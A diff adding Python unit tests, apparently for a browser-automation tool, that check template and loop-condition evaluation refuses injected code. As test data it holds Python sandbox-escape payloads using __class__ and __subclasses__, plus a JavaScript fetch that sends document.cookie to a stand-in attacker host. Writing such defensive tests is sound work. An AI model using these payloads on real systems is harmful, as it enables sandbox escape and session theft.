@@ -68,6 +68,19 @@ class TestSubstituteTemplateVars:
         # Non-evaluable expression containing 'i' is left untouched.
         assert substitute_template_vars("{i+}", 1) == "{i+}"
 
+    def test_rejects_sandbox_escape(self):
+        # An attribute-access payload must NOT be evaluated (eval sandbox
+        # escape vector). It is left verbatim.
+        payload = "{(i).__class__.__bases__}"
+        assert substitute_template_vars(payload, 0) == payload
+
+    def test_rejects_subscript_call(self):
+        payload = "x-{(index).__class__.__subclasses__()}"
+        assert substitute_template_vars(payload, 0) == payload
+
+    def test_division_still_works(self):
+        assert substitute_template_vars("{i//2}", 5) == "2"
+
 
 # ── exec_loop ─────────────────────────────────────────────────────────
 
@@ -163,6 +176,22 @@ class TestExecLoop:
         result = await exec_loop(driver, action, dispatch)
         assert result is True
         assert dispatch.call_count == 2
+
+    async def test_dangerous_condition_fails_safe(self):
+        # An injection attempt must never be evaluated; the loop fails safe
+        # (condition treated as False → body never runs).
+        driver = AsyncMock()
+        driver.evaluate = AsyncMock(return_value=True)
+        dispatch = AsyncMock(return_value=True)
+        action = Loop(
+            actions=[{"action": "click", "selector": ".btn"}],
+            iterations=3,
+            condition="fetch('https://evil.example/?c='+document.cookie)",
+        )
+        result = await exec_loop(driver, action, dispatch)
+        assert result is True
+        assert dispatch.call_count == 0
+        driver.evaluate.assert_not_called()
 
 
 # ── exec_conditional ──────────────────────────────────────────────────
